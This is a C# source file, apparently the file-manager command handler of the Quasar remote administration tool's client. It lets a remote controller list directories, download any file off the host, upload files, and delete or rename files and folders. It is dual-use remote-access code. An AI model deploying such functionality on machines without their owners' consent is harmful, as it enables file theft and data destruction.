using Quasar.Client.Utilities;
using Quasar.Common.Enums;
using Quasar.Common.Extensions;
using Quasar.Common.IO;
using Quasar.Common.Messages;
using Quasar.Common.Models;
using System;
using System.IO;
using System.Security;
using System.Threading;

namespace Quasar.Client.Commands
{
    /* THIS PARTIAL CLASS SHOULD CONTAIN METHODS THAT MANIPULATE DIRECTORIES AND FILES (excluding the program). */
    public static partial class CommandHandler
    {
        public static void HandleGetDirectory(GetDirectory command, Networking.Client client)
        {
            bool isError = false;
            string message = null;

            Action<string> onError = (msg) =>
            {
                isError = true;
                message = msg;
            };

            try
            {
                DirectoryInfo dicInfo = new DirectoryInfo(command.RemotePath);

                FileInfo[] files = dicInfo.GetFiles();
                DirectoryInfo[] directories = dicInfo.GetDirectories();

                FileSystemEntry[] items = new FileSystemEntry[files.Length + directories.Length];

                int offset = 0;
                for (int i = 0; i < directories.Length; i++, offset++)
                {
                    items[i] = new FileSystemEntry
                    {
                        EntryType = FileType.Directory, Name = directories[i].Name, Size = 0,
                        LastAccessTimeUtc = directories[i].LastAccessTimeUtc
                    };
                }

                for (int i = 0; i < files.Length; i++)
                {
                    items[i + offset] = new FileSystemEntry
                    {
                        EntryType = FileType.File, Name = files[i].Name, Size = files[i].Length,
                        ContentType = Path.GetExtension(files[i].Name).ToContentType(),
                        LastAccessTimeUtc = files[i].LastAccessTimeUtc
                    };
                }

                client.Send(new GetDirectoryResponse {RemotePath = command.RemotePath, Items = items});
            }
            catch (UnauthorizedAccessException)
            {
                onError("GetDirectory No permission");
            }
            catch (SecurityException)
            {
                onError("GetDirectory No permission");
            }
            catch (PathTooLongException)
            {
                onError("GetDirectory Path too long");
            }
            catch (DirectoryNotFoundException)
            {
                onError("GetDirectory Directory not found");
            }
            catch (FileNotFoundException)
            {
                onError("GetDirectory File not found");
            }
            catch (IOException)
            {
                onError("GetDirectory I/O error");
            }
            catch (Exception)
            {
                onError("GetDirectory Failed");
            }
            finally
            {
                if (isError && !string.IsNullOrEmpty(message))
                    client.Send(new SetStatusFileManager {Message = message, SetLastDirectorySeen = true});
            }
        }

        public static void HandleDoDownloadFile(FileTransferRequest command, Networking.Client client)
        {
            new Thread(() =>
            {
                LimitThreads.WaitOne();
                try
                {
                    using (var srcFile = new FileSplit(command.RemotePath, FileAccess.Read))
                    {
                        ActiveTransfers[command.Id] = srcFile;
                        foreach (var chunk in srcFile)
                        {
                            if (!client.Connected || !ActiveTransfers.ContainsKey(command.Id))
                                break;

                            // blocking sending might not be required, needs further testing
                            client.SendBlocking(new FileTransferChunk
                            {
                                Id = command.Id,
                                FilePath = command.RemotePath,
                                FileSize = srcFile.FileSize,
                                Chunk = chunk
                            });
                        }
                    }
                }
                catch (Exception)
                {
                    client.Send(new FileTransferCancel
                    {
                        Id = command.Id,
                        Reason = "Error reading file"
                    });
                }
                finally
                {
                    RemoveFileTransfer(command.Id);
                    LimitThreads.Release();
                }
            }).Start();
        }

        public static void HandleDoDownloadFileCancel(FileTransferCancel command, Networking.Client client)
        {
            if (ActiveTransfers.ContainsKey(command.Id))
            {
                RemoveFileTransfer(command.Id);
                client.Send(new FileTransferCancel
                {
                    Id = command.Id,
                    Reason = "Canceled"
                });
            }
        }

        public static void HandleDoUploadFile(FileTransferChunk command, Networking.Client client)
        {
            try
            {
                if (command.Chunk.Offset == 0)
                {
                    if (File.Exists(command.FilePath))
                    {
                        NativeMethods.DeleteFile(command.FilePath); // delete existing file
                    }

                    ActiveTransfers[command.Id] = new FileSplit(command.FilePath, FileAccess.Write);
                }

                if (!ActiveTransfers.ContainsKey(command.Id))
                    return;

                var destFile = ActiveTransfers[command.Id];
                destFile.WriteChunk(command.Chunk);

                if (destFile.FileSize == command.FileSize)
                {
                    RemoveFileTransfer(command.Id);
                }
            }
            catch (Exception)
            {
                RemoveFileTransfer(command.Id);
                client.Send(new FileTransferCancel
                {
                    Id = command.Id,
                    Reason = "Error writing file"
                });
            }
        }

        public static void HandleDoPathDelete(DoPathDelete command, Networking.Client client)
        {
            bool isError = false;
            string message = null;

            Action<string> onError = (msg) =>
            {
                isError = true;
                message = msg;
            };

            try
            {
                switch (command.PathType)
                {
                    case FileType.Directory:
                        Directory.Delete(command.Path, true);
                        client.Send(new SetStatusFileManager
                        {
                            Message = "Deleted directory",
                            SetLastDirectorySeen = false
                        });
                        break;
                    case FileType.File:
                        File.Delete(command.Path);
                        client.Send(new SetStatusFileManager
                        {
                            Message = "Deleted file",
                            SetLastDirectorySeen = false
                        });
                        break;
                }

                HandleGetDirectory(new GetDirectory { RemotePath = Path.GetDirectoryName(command.Path) }, client);
            }
            catch (UnauthorizedAccessException)
            {
                onError("DeletePath No permission");
            }
            catch (PathTooLongException)
            {
                onError("DeletePath Path too long");
            }
            catch (DirectoryNotFoundException)
            {
                onError("DeletePath Path not found");
            }
            catch (IOException)
            {
                onError("DeletePath I/O error");
            }
            catch (Exception)
            {
                onError("DeletePath Failed");
            }
            finally
            {
                if (isError && !string.IsNullOrEmpty(message))
                    client.Send(new SetStatusFileManager {Message = message, SetLastDirectorySeen = false});
            }
        }

        public static void HandleDoPathRename(DoPathRename command, Networking.Client client)
        {
            bool isError = false;
            string message = null;

            Action<string> onError = (msg) =>
            {
                isError = true;
                message = msg;
            };

            try
            {
                switch (command.PathType)
                {
                    case FileType.Directory:
                        Directory.Move(command.Path, command.NewPath);
                        client.Send(new SetStatusFileManager
                        {
                            Message = "Renamed directory",
                            SetLastDirectorySeen = false
                        });
                        break;
                    case FileType.File:
                        File.Move(command.Path, command.NewPath);
                        client.Send(new SetStatusFileManager
                        {
                            Message = "Renamed file",
                            SetLastDirectorySeen = false
                        });
                        break;
                }

                HandleGetDirectory(new GetDirectory {RemotePath = Path.GetDirectoryName(command.NewPath)}, client);
            }
            catch (UnauthorizedAccessException)
            {
                onError("RenamePath No permission");
            }
            catch (PathTooLongException)
            {
                onError("RenamePath Path too long");
            }
            catch (DirectoryNotFoundException)
            {
                onError("RenamePath Path not found");
            }
            catch (IOException)
            {
                onError("RenamePath I/O error");
            }
            catch (Exception)
            {
                onError("RenamePath Failed");
            }
            finally
            {
                if (isError && !string.IsNullOrEmpty(message))
                    client.Send(new SetStatusFileManager { Message = message, SetLastDirectorySeen = false });
            }
        }

        private static void RemoveFileTransfer(int id)
        {
            if (ActiveTransfers.ContainsKey(id))
            {
                ActiveTransfers[id].Dispose();
                ActiveTransfers.TryRemove(id, out _);
            }
        }
    }
}
